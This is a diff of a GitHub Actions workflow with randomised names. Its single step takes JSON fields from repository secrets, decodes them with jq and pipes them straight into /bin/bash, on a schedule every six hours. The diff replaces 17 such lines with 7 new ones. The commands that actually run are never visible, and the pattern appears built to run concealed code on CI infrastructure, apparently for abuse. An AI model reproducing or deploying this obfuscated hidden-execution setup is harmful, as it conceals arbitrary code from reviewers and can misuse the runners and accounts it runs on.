@@ -1,9 +1,8 @@
 name: xuntianzong2387
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '27 5/6 * * *'
+    - cron: '28 3/6 * * *'
 
 jobs:
   build:
@@ -12,23 +11,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: xuntianzong2387
         env:
-          onoj4: ${{ secrets.onoj4 }}
+          u18: ${{ secrets.u18 }}
         run: |
-          echo $onoj4 | jq -r .bsou0 | /bin/bash
-          echo $r62112 | jq -r .ijbrw1650 | /bin/bash
-          echo $rb806 | jq -r .zgnhj09977 | /bin/bash
-          echo $azymy0693 | jq -r .fdia52765 | /bin/bash
-          echo $nyz1020 | jq -r .rbd5875 | /bin/bash
-          echo $guzw9114 | jq -r .sgyt87934 | /bin/bash
-          echo $l99233 | jq -r .obmiz64605 | /bin/bash
-          echo $x99889 | jq -r .ruxoh68532 | /bin/bash
-          echo $ecpsu92 | jq -r .wn01241 | /bin/bash
-          echo $swbt1677 | jq -r .bw9 | /bin/bash
-          echo $q202 | jq -r .gwixk916 | /bin/bash
-          echo $tghtn850 | jq -r .wu7 | /bin/bash
-          echo $yksku7402 | jq -r .kn3 | /bin/bash
-          echo $q7116 | jq -r .c75 | /bin/bash
-          echo $jzrg62328 | jq -r .e2 | /bin/bash
-          echo $l0970 | jq -r .ty00 | /bin/bash
-          echo $kfx6 | jq -r .odk29823 | /bin/bash
+          echo $u18 | jq -r .bybua30332 | /bin/bash
+          echo $riwjb69 | jq -r .r87 | /bin/bash
+          echo $afvm0123 | jq -r .iopq413 | /bin/bash
+          echo $lazmz03477 | jq -r .ttya22221 | /bin/bash
+          echo $sog505 | jq -r .zaxs5 | /bin/bash
+          echo $mbrt433 | jq -r .rymot7 | /bin/bash
+          echo $oara7 | jq -r .s61 | /bin/bash
 
